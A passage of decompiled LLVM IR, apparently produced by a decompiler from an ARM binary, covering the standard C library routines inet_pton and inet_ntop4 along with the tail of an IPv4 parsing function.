  %v0_164c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_164c8 = add i32 %v0_164c8, 1
  store i32 %v1_164c8, i32* %r1.global-to-local, align 4
  %v8_164cc = icmp sgt i32 %v1_164c0, 4
  br i1 %v8_164cc, label %dec_label_pc_1652c, label %dec_label_pc_164f8.backedge

dec_label_pc_164d4:                               ; preds = %dec_label_pc_16490
  %v7_164d4 = icmp eq i32 %v0_164d4, 46
  store i1 %v7_164d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_164d4, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_164d4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1652c

bb:                                               ; preds = %dec_label_pc_164d4
  %v1_164dc = load i32, i32* %r1.global-to-local, align 4
  %v2_164dc = urem i32 %v1_164dc, 2
  %v2_164e0 = icmp eq i32 %v2_164dc, 0
  store i1 %v2_164e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_164e0, label %dec_label_pc_1652c, label %dec_label_pc_164ec

dec_label_pc_164ec:                               ; preds = %bb
  %v0_164ec = load i32, i32* @lr, align 4
  %v7_164ec = icmp eq i32 %v0_164ec, 4
  store i1 %v7_164ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_164ec, label %dec_label_pc_1652c, label %dec_label_pc_164f4

dec_label_pc_164f4:                               ; preds = %dec_label_pc_164ec
  %v2_164f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_164f4 = add i32 %v2_164f4, 1
  %v4_164f4 = inttoptr i32 %v3_164f4 to i8*
  store i8 0, i8* %v4_164f4, align 1
  %v5_164f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_164f4 = add i32 %v5_164f4, 1
  store i32 %v6_164f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164f8.backedge

dec_label_pc_164f8.backedge:                      ; preds = %dec_label_pc_164f4, %dec_label_pc_164b4, %dec_label_pc_164c0
  %v0_164f8 = load i32, i32* @r4, align 4
  %v1_164f8 = inttoptr i32 %v0_164f8 to i8*
  %v2_164f8 = load i8, i8* %v1_164f8, align 1
  %v3_164f8 = zext i8 %v2_164f8 to i32
  store i32 %v3_164f8, i32* @ip, align 4
  %v5_164f8 = add i32 %v0_164f8, 1
  store i32 %v5_164f8, i32* @r4, align 4
  %v2_164fc = icmp eq i8 %v2_164f8, 0
  store i1 %v2_164fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164fc, label %dec_label_pc_164f8.dec_label_pc_16508_crit_edge, label %dec_label_pc_16490

dec_label_pc_164f8.dec_label_pc_16508_crit_edge:  ; preds = %dec_label_pc_164f8.backedge
  %v0_16508.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %dec_label_pc_164f8.dec_label_pc_16508_crit_edge, %entry
  %v0_16508 = phi i32 [ %v0_16508.pre, %dec_label_pc_164f8.dec_label_pc_16508_crit_edge ], [ 0, %entry ]
  %v7_16508 = icmp eq i32 %v0_16508, 3
  store i1 %v7_16508, i1* %cpsr_z.global-to-local, align 1
  %v7_1650c = icmp slt i32 %v0_16508, 4
  br i1 %v7_1650c, label %dec_label_pc_1652c, label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %dec_label_pc_16508
  %v0_16510 = load i32, i32* @r5, align 4
  store i32 %v0_16510, i32* @r0, align 4
  store i32 %v2_16470, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1651c = call i32 @memcpy()
  br label %dec_label_pc_1652c

dec_label_pc_1652c:                               ; preds = %dec_label_pc_1649c, %dec_label_pc_164c0, %bb, %dec_label_pc_164ec, %.thread12, %dec_label_pc_16508, %dec_label_pc_16510
  %storemerge = phi i32 [ 1, %dec_label_pc_16510 ], [ 0, %dec_label_pc_16508 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_164ec ], [ 0, %bb ], [ 0, %dec_label_pc_164c0 ], [ 0, %dec_label_pc_1649c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_16468, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_16508, { 1, 0 }
  uselistorder i32 %v3_164f8, { 2, 1, 0 }
  uselistorder i32 %v0_164d4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 0, 5, 6, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_1652c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_164f8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16490, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16534 = load i32, i32* @r4, align 4
  %v6_16534 = load i32, i32* @r5, align 4
  %v9_16534 = load i32, i32* @r6, align 4
  %v7_16538 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_16538, label %dec_label_pc_16558, label %dec_label_pc_1654c

dec_label_pc_1654c:                               ; preds = %entry
  %v7_1654c = icmp eq i32 %arg1, 10
  br i1 %v7_1654c, label %dec_label_pc_1656c, label %dec_label_pc_1671c

dec_label_pc_16558:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_16560 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_16560, i32* %r0.global-to-local, align 4
  store i32 %v4_16560, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16734

dec_label_pc_1656c:                               ; preds = %dec_label_pc_1654c
  %v2_1656c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1656c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_16578 = bitcast i32* %stack_var_-52 to i8*
  %v3_16578 = call i32 @__GI_memset(i8* %v2_16578, i32 0)
  store i32 %v3_16578, i32* %r0.global-to-local, align 4
  %v0_1657c = load i32, i32* @r6, align 4
  %v1_1657c = inttoptr i32 %v0_1657c to i8*
  %v2_1657c = load i8, i8* %v1_1657c, align 1
  %v3_1657c = zext i8 %v2_1657c to i32
  store i32 %v3_1657c, i32* %r3.global-to-local, align 4
  %v7_16580 = icmp eq i8 %v2_1657c, 58
  store i32 %v3_16578, i32* @r4, align 4
  %v2_16588 = add i32 %v3_16578, 16
  store i32 %v2_16588, i32* %r8.global-to-local, align 4
  br i1 %v7_16580, label %dec_label_pc_16590, label %dec_label_pc_1659c

dec_label_pc_16590:                               ; preds = %dec_label_pc_1656c
  %v1_16590 = add i32 %v0_1657c, 1
  %v2_16590 = inttoptr i32 %v1_16590 to i8*
  %v3_16590 = load i8, i8* %v2_16590, align 1
  %v4_16590 = zext i8 %v3_16590 to i32
  store i32 %v4_16590, i32* %r3.global-to-local, align 4
  store i32 %v1_16590, i32* @r6, align 4
  %v7_16594 = icmp eq i8 %v3_16590, 58
  br i1 %v7_16594, label %dec_label_pc_1659c, label %dec_label_pc_16730

dec_label_pc_1659c:                               ; preds = %dec_label_pc_16590, %dec_label_pc_1656c
  %v0_165a0 = phi i32 [ %v1_16590, %dec_label_pc_16590 ], [ %v0_1657c, %dec_label_pc_1656c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_165a0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1667c7 = inttoptr i32 %v0_165a0 to i8*
  %v2_1667c8 = load i8, i8* %v1_1667c7, align 1
  %v3_1667c9 = zext i8 %v2_1667c8 to i32
  store i32 %v3_1667c9, i32* %r0.global-to-local, align 4
  %v1_1668010 = call i32 @__GI_tolower(i32 %v3_1667c9)
  store i32 %v1_1668010, i32* %r0.global-to-local, align 4
  store i32 %v1_1668010, i32* @r5, align 4
  %v2_1668412 = icmp eq i32 %v1_1668010, 0
  br i1 %v2_1668412, label %dec_label_pc_1668c, label %dec_label_pc_165b0

dec_label_pc_165b0:                               ; preds = %dec_label_pc_1659c, %dec_label_pc_1667c.backedge
  %v0_165b4 = phi i32 [ %v1_16680, %dec_label_pc_1667c.backedge ], [ %v1_1668010, %dec_label_pc_1659c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1667c.backedge ], [ 0, %dec_label_pc_1659c ]
  store i32 ptrtoint ([17 x i8]* @global_var_1b04c.919 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1b04c.919 to i32), i32* %r0.global-to-local, align 4
  %v3_165bc = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1b04c.919 to i32), i32 %v0_165b4)
  %v4_165bc = trunc i32 %v3_165bc to i8
  store i32 %v3_165bc, i32* %r0.global-to-local, align 4
  %v3_165c0 = icmp eq i8 %v4_165bc, 0
  %v0_165c4 = load i32, i32* @r6, align 4
  %v1_165c4 = add i32 %v0_165c4, 1
  store i32 %v1_165c4, i32* @r6, align 4
  br i1 %v3_165c0, label %dec_label_pc_165e0, label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165b0
  %v0_165cc = load i32, i32* %sb.global-to-local, align 4
  %v2_165cc = sext i8 %v4_165bc to i32
  %v3_165cc = sub i32 %v2_165cc, %v0_165cc
  store i32 %v3_165cc, i32* %r3.global-to-local, align 4
  %v1_165d0 = load i32, i32* %r7.global-to-local, align 4
  %v4_165d0 = mul i32 %v1_165d0, 16
  %v5_165d0 = or i32 %v4_165d0, %v3_165cc
  store i32 %v5_165d0, i32* %r7.global-to-local, align 4
  %v3_165d8 = icmp ult i32 %v5_165d0, 65534
  br i1 %v3_165d8, label %dec_label_pc_16674, label %dec_label_pc_16730

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165b0
  %v0_165e0 = load i32, i32* @r5, align 4
  %v7_165e0 = icmp eq i32 %v0_165e0, 58
  br i1 %v7_165e0, label %dec_label_pc_165e8, label %dec_label_pc_16644

dec_label_pc_165e8:                               ; preds = %dec_label_pc_165e0
  %v4_165e82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_165e82, i32* %r3.global-to-local, align 4
  %v2_165ec = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_165ec, label %dec_label_pc_165f4, label %dec_label_pc_16608

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165e8
  %v0_165f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_165f4 = icmp eq i32 %v0_165f4, 0
  br i1 %v2_165f4, label %dec_label_pc_165fc, label %dec_label_pc_16730

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165f4
  %v0_165fc = load i32, i32* @r4, align 4
  store i32 %v0_165fc, i32* %fp.global-to-local, align 4
  store i32 %v1_165c4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1667c.backedge

dec_label_pc_16608:                               ; preds = %dec_label_pc_165e8
  %v1_16608 = inttoptr i32 %v1_165c4 to i8*
  %v2_16608 = load i8, i8* %v1_16608, align 1
  %v3_16608 = zext i8 %v2_16608 to i32
  store i32 %v3_16608, i32* %r3.global-to-local, align 4
  %v2_1660c = icmp eq i8 %v2_16608, 0
  br i1 %v2_1660c, label %dec_label_pc_16730, label %dec_label_pc_16614

dec_label_pc_16614:                               ; preds = %dec_label_pc_16608
  %v0_16614 = load i32, i32* @r4, align 4
  %v1_16614 = add i32 %v0_16614, 2
  store i32 %v1_16614, i32* %r3.global-to-local, align 4
  %v1_16618 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_16614, %v1_16618
  br i1 %tmp38, label %dec_label_pc_16730, label %dec_label_pc_16620

dec_label_pc_16620:                               ; preds = %dec_label_pc_16614
  %v0_16620 = load i32, i32* %r7.global-to-local, align 4
  %v3_16620 = udiv i32 %v0_16620, 256
  store i32 %v3_16620, i32* %r2.global-to-local, align 4
  store i32 %v0_16614, i32* %r3.global-to-local, align 4
  %v1_16628 = trunc i32 %v3_16620 to i8
  %v3_16628 = inttoptr i32 %v0_16614 to i8*
  store i8 %v1_16628, i8* %v3_16628, align 1
  %v4_16628 = load i32, i32* %r3.global-to-local, align 4
  %v5_16628 = add i32 %v4_16628, 1
  store i32 %v5_16628, i32* %r3.global-to-local, align 4
  %v0_1662c = load i32, i32* @r6, align 4
  store i32 %v0_1662c, i32* %sl.global-to-local, align 4
  %v0_16630 = load i32, i32* %r7.global-to-local, align 4
  %v1_16630 = trunc i32 %v0_16630 to i8
  %v2_16630 = load i32, i32* @r4, align 4
  %v3_16630 = add i32 %v2_16630, 1
  %v4_16630 = inttoptr i32 %v3_16630 to i8*
  store i8 %v1_16630, i8* %v4_16630, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16638 = load i32, i32* %r3.global-to-local, align 4
  %v1_16638 = add i32 %v0_16638, 1
  store i32 %v1_16638, i32* @r4, align 4
  %v0_1667c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1667c.backedge

dec_label_pc_16644:                               ; preds = %dec_label_pc_165e0
  %v7_16644 = icmp eq i32 %v0_165e0, 46
  br i1 %v7_16644, label %dec_label_pc_1664c, label %dec_label_pc_16730

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16644
  %v0_1664c = load i32, i32* @r4, align 4
  %v1_1664c = add i32 %v0_1664c, 4
  store i32 %v1_1664c, i32* @r5, align 4
  %v1_16650 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1664c, %v1_16650
  br i1 %tmp39, label %dec_label_pc_16730, label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %dec_label_pc_1664c
  %v0_1665c = load i32, i32* %sl.global-to-local, align 4
  %v1_1665c = inttoptr i32 %v0_1665c to i8*
  store i32 %v0_1665c, i32* %r0.global-to-local, align 4
  %v4_16660 = call i32 @inet_pton4(i8* %v1_1665c, i32 %v0_1664c)
  store i32 %v4_16660, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_16660, 1
  br i1 %tmp36, label %dec_label_pc_16730, label %bb

bb:                                               ; preds = %dec_label_pc_16658
  %v5_16668 = load i32, i32* @r5, align 4
  store i32 %v5_16668, i32* @r4, align 4
  br label %dec_label_pc_166b8

dec_label_pc_16674:                               ; preds = %dec_label_pc_165cc
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1667c.backedge

dec_label_pc_1667c.backedge:                      ; preds = %dec_label_pc_16674, %dec_label_pc_165fc, %dec_label_pc_16620
  %v0_1667c = phi i32 [ %v1_165c4, %dec_label_pc_165fc ], [ %v0_1667c.pre, %dec_label_pc_16620 ], [ %v1_165c4, %dec_label_pc_16674 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_165fc ], [ 0, %dec_label_pc_16620 ], [ 1, %dec_label_pc_16674 ]
  %v1_1667c = inttoptr i32 %v0_1667c to i8*
  %v2_1667c = load i8, i8* %v1_1667c, align 1
  %v3_1667c = zext i8 %v2_1667c to i32
  store i32 %v3_1667c, i32* %r0.global-to-local, align 4
  %v1_16680 = call i32 @__GI_tolower(i32 %v3_1667c)
  store i32 %v1_16680, i32* %r0.global-to-local, align 4
  store i32 %v1_16680, i32* @r5, align 4
  %v2_16684 = icmp eq i32 %v1_16680, 0
  br i1 %v2_16684, label %dec_label_pc_1668c, label %dec_label_pc_165b0

dec_label_pc_1668c:                               ; preds = %dec_label_pc_1667c.backedge, %dec_label_pc_1659c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1659c ], [ %stack_var_-56.0.be, %dec_label_pc_1667c.backedge ]
  %v4_1668c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1668c3, i32* %r3.global-to-local, align 4
  %v2_16690 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_166fc.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_16690, label %dec_label_pc_166b8, label %dec_label_pc_16698

dec_label_pc_16698:                               ; preds = %dec_label_pc_1668c
  %v1_16698 = add i32 %v0_166fc.pre.pre, 2
  store i32 %v1_16698, i32* %r3.global-to-local, align 4
  %v1_1669c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_16698, %v1_1669c
  br i1 %tmp40, label %dec_label_pc_16730, label %dec_label_pc_166a4

dec_label_pc_166a4:                               ; preds = %dec_label_pc_16698
  store i32 %v0_166fc.pre.pre, i32* %r3.global-to-local, align 4
  %v0_166a8 = load i32, i32* %r7.global-to-local, align 4
  %v3_166a8 = udiv i32 %v0_166a8, 256
  store i32 %v3_166a8, i32* %r2.global-to-local, align 4
  %v1_166ac = trunc i32 %v3_166a8 to i8
  %v3_166ac = inttoptr i32 %v0_166fc.pre.pre to i8*
  store i8 %v1_166ac, i8* %v3_166ac, align 1
  %v4_166ac = load i32, i32* %r3.global-to-local, align 4
  %v5_166ac = add i32 %v4_166ac, 1
  store i32 %v5_166ac, i32* %r3.global-to-local, align 4
  %v0_166b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_166b0 = trunc i32 %v0_166b0 to i8
  %v2_166b0 = load i32, i32* @r4, align 4
  %v3_166b0 = add i32 %v2_166b0, 1
  %v4_166b0 = inttoptr i32 %v3_166b0 to i8*
  store i8 %v1_166b0, i8* %v4_166b0, align 1
  %v0_166b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_166b4 = add i32 %v0_166b4, 1
  store i32 %v1_166b4, i32* @r4, align 4
  br label %dec_label_pc_166b8

dec_label_pc_166b8:                               ; preds = %dec_label_pc_1668c, %bb, %dec_label_pc_166a4
  %v0_166fc.pre = phi i32 [ %v5_16668, %bb ], [ %v1_166b4, %dec_label_pc_166a4 ], [ %v0_166fc.pre.pre, %dec_label_pc_1668c ]
  %v0_166b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_166b8 = icmp eq i32 %v0_166b8, 0
  %v1_166fc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_166b8, label %dec_label_pc_166fc, label %dec_label_pc_166c0

dec_label_pc_166c0:                               ; preds = %dec_label_pc_166b8
  %v9_166c0 = icmp eq i32 %v0_166fc.pre, %v1_166fc.pre
  %v2_166c4 = sub i32 %v0_166fc.pre, %v0_166b8
  store i32 %v2_166c4, i32* %r0.global-to-local, align 4
  br i1 %v9_166c0, label %dec_label_pc_16730, label %dec_label_pc_166e4.preheader

dec_label_pc_166e4.preheader:                     ; preds = %dec_label_pc_166c0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_166e4

dec_label_pc_166d4:                               ; preds = %dec_label_pc_166e4
  %v0_166d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_166d4 = add i32 %v0_166d4, %v2_166e8
  %v3_166d4 = inttoptr i32 %v2_166d4 to i8*
  %v4_166d4 = load i8, i8* %v3_166d4, align 1
  %v3_166d8 = inttoptr i32 %v2_166ec to i8*
  store i8 %v4_166d4, i8* %v3_166d8, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_166e0 = load i32, i32* %fp.global-to-local, align 4
  %v3_166e0 = load i32, i32* @ip, align 4
  %v4_166e0 = add i32 %v3_166e0, %v2_166e0
  %v5_166e0 = inttoptr i32 %v4_166e0 to i8*
  store i8 0, i8* %v5_166e0, align 1
  %v0_166e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166e4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_166ec.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %dec_label_pc_166e4.preheader, %dec_label_pc_166d4
  %v0_166f8 = phi i32 [ %v1_166fc.pre, %dec_label_pc_166e4.preheader ], [ %v1_166ec.pre, %dec_label_pc_166d4 ]
  %v1_166e8 = phi i32 [ %v2_166c4, %dec_label_pc_166e4.preheader ], [ %v1_166e4.pre, %dec_label_pc_166d4 ]
  %v0_166f0 = phi i32 [ 1, %dec_label_pc_166e4.preheader ], [ %v0_166e4.pre, %dec_label_pc_166d4 ]
  %v2_166e8 = sub i32 %v1_166e8, %v0_166f0
  store i32 %v2_166e8, i32* @ip, align 4
  %v2_166ec = sub i32 %v0_166f8, %v0_166f0
  store i32 %v2_166ec, i32* @lr, align 4
  %v1_166f0 = add i32 %v0_166f0, 1
  store i32 %v1_166f0, i32* %r2.global-to-local, align 4
  %v7_166f4 = icmp slt i32 %v1_166e8, %v0_166f0
  br i1 %v7_166f4, label %dec_label_pc_166f8, label %dec_label_pc_166d4

dec_label_pc_166f8:                               ; preds = %dec_label_pc_166e4
  store i32 %v0_166f8, i32* @r4, align 4
  br label %dec_label_pc_166fc

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166b8, %dec_label_pc_166f8
  %v0_166fc = phi i32 [ %v0_166f8, %dec_label_pc_166f8 ], [ %v0_166fc.pre, %dec_label_pc_166b8 ]
  %v1_166fc = phi i32 [ %v0_166f8, %dec_label_pc_166f8 ], [ %v1_166fc.pre, %dec_label_pc_166b8 ]
  %v9_166fc = icmp eq i32 %v0_166fc, %v1_166fc
  br i1 %v9_166fc, label %dec_label_pc_16704, label %dec_label_pc_16730

dec_label_pc_16704:                               ; preds = %dec_label_pc_166fc
  store i32 16, i32* @r2, align 4
  %v2_16708 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_16708, i32* @r0, align 4
  store i32 %v2_1656c, i32* @r1, align 4
  %v0_16710 = call i32 @memcpy()
  store i32 %v0_16710, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16734

dec_label_pc_1671c:                               ; preds = %dec_label_pc_1654c
  %v0_1671c = call i32 @__errno_location()
  store i32 %v0_1671c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16728 = inttoptr i32 %v0_1671c to i32*
  store i32 97, i32* %v2_16728, align 4
  %v0_16734.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16734

dec_label_pc_16730:                               ; preds = %dec_label_pc_165cc, %dec_label_pc_165f4, %dec_label_pc_16614, %dec_label_pc_16608, %dec_label_pc_16658, %dec_label_pc_166c0, %dec_label_pc_16644, %dec_label_pc_166fc, %dec_label_pc_16590, %dec_label_pc_1664c, %dec_label_pc_16698
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16734

dec_label_pc_16734:                               ; preds = %dec_label_pc_16558, %dec_label_pc_1671c, %dec_label_pc_16704, %dec_label_pc_16730
  %v0_16734 = phi i32 [ %v4_16560, %dec_label_pc_16558 ], [ %v0_16734.pre, %dec_label_pc_1671c ], [ 1, %dec_label_pc_16704 ], [ 0, %dec_label_pc_16730 ]
  store i32 %v0_16734, i32* %r0.global-to-local, align 4
  store i32 %v3_16534, i32* @r4, align 4
  store i32 %v6_16534, i32* @r5, align 4
  store i32 %v9_16534, i32* @r6, align 4
  ret i32 %v0_16734

; uselistorder directives
  uselistorder i32 %v0_16734, { 1, 0 }
  uselistorder i32 %v2_166ec, { 1, 0 }
  uselistorder i32 %v2_166e8, { 1, 0 }
  uselistorder i32 %v0_166f0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_166f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_166fc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_166fc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_166a8, { 1, 0 }
  uselistorder i32 %v0_166fc.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16680, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1665c, { 1, 0 }
  uselistorder i32 %v3_16620, { 1, 0 }
  uselistorder i32 %v0_16614, { 1, 0, 2 }
  uselistorder i32 %v1_165c4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_165bc, { 1, 0 }
  uselistorder i32 %v0_165a0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 3, 1, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 5, 6, 0, 2, 3, 1, 4, 7 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 15, 16, 14, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 8, 7, 9, 10, 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 16, 14, 15, 7, 6, 17, 3, 5, 4, 2, 1, 9, 8, 11, 10, 0 }
  uselistorder i32* %fp.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i8 1, { 4, 1, 3, 2, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32 58, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 (i8*, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_16734, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_16730, { 7, 5, 10, 4, 9, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_166fc, { 1, 0 }
  uselistorder label %dec_label_pc_166e4, { 1, 0 }
  uselistorder label %dec_label_pc_166b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1667c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_165b0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16744 = load i32, i32* @r4, align 4
  store i32 %v3_16744, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1b038.921 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_16760 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_16760, i32* @r0, align 4
  %v0_16764 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_16774 = bitcast i32* %stack_var_-51 to i8*
  %v3_16774 = call i32 @__GI_memset(i8* %v2_16774, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1683c = ptrtoint i32* %stack_var_-36 to i32
  %v2_16818 = add i32 %v2_1683c, -17
  br label %dec_label_pc_1683c

dec_label_pc_16784:                               ; preds = %dec_label_pc_1683c
  %v0_16784 = load i32, i32* %fp.global-to-local, align 4
  %v2_16784 = add i32 %v0_16784, %v1_16784
  %v3_16784 = inttoptr i32 %v2_16784 to i8*
  %v4_16784 = load i8, i8* %v3_16784, align 1
  %v6_16784 = zext i8 %v4_16784 to i32
  store i32 %v6_16784, i32* %r4.global-to-local, align 4
  %v1_16788 = add i32 %v0_16788, 1
  store i32 %v1_16788, i32* %r7.global-to-local, align 4
  store i32 %v2_1683c, i32* %r2.global-to-local, align 4
  %v2_16794 = add i32 %v1_16788, %v2_1683c
  store i32 %v2_16794, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_16784, 100
  %v1_1679c = or i8 %div, 48
  %v3_167a0 = add i32 %v2_1684c, -17
  %v4_167a0 = inttoptr i32 %v3_167a0 to i8*
  store i8 %v1_1679c, i8* %v4_167a0, align 1
  %v0_167a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167a4 = add i32 %v0_167a4, -17
  %v2_167a4 = inttoptr i32 %v1_167a4 to i8*
  %v3_167a4 = load i8, i8* %v2_167a4, align 1
  %v7_167a8 = icmp eq i8 %v3_167a4, 48
  %v0_167ac = load i32, i32* %fp.global-to-local, align 4
  %v1_167ac = load i32, i32* %r8.global-to-local, align 4
  %v2_167ac = add i32 %v1_167ac, %v0_167ac
  store i32 %v2_167ac, i32* %sb.global-to-local, align 4
  %v0_167b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_167bc = udiv i32 %v0_167b4, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_167c4 = urem i32 %v2_167bc, 256
  %v2_167c8 = urem i32 %v1_167c4, 10
  %v1_167cc = or i32 %v2_167c8, 48
